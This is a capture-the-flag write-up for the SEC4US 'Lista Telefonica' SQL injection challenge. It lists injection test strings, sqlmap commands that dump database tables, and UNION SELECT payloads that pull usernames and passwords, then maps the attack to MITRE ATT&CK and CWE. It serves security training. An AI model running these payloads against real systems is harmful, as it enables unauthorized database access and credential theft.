# maq109: Lista Telefonica

Writeup for the **Lista Telefonica** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** SQL Injection  
> **Difficulty:** Easy  
> **Points:** 109

---

## Overview

A phone directory web application accepts user search input without sanitization, making it vulnerable to SQL injection. Exploiting this flaw reveals stored records, credentials, and the challenge flag.

## Reconnaissance

Scan the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Access the phone directory application and identify the search functionality. Test how user input is processed by the backend query.

## Exploitation

### Step 1: Detect SQL Injection

Submit test payloads in the search field:

```
' OR '1'='1
' OR 1=1-- -
```

Observe whether the application returns all records or produces an error.

### Step 2: Enumerate the Database

Use sqlmap for automated extraction:

```bash
sqlmap -u "http://<TARGET_IP>/search?name=test" --dbs
sqlmap -u "http://<TARGET_IP>/search?name=test" -D <database> --tables
sqlmap -u "http://<TARGET_IP>/search?name=test" -D <database> -T <table> --dump
```

### Step 3: Manual Extraction (Alternative)

If manual exploitation is preferred, determine column count and extract data:

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password,3 FROM users-- -
```

### Step 4: Retrieve the Flag

The flag is stored in the database. Extract it from the relevant table or use dumped credentials to access the system.

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Data from Information Repositories | T1213    |
| Brute Force                       | T1110     |

### CWE

- **CWE-89:** SQL Injection
- **CWE-522:** Insufficiently Protected Credentials

---

A phone book should only list names and numbers; when the query behind it answers every question you ask, the directory reveals far more than contacts.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
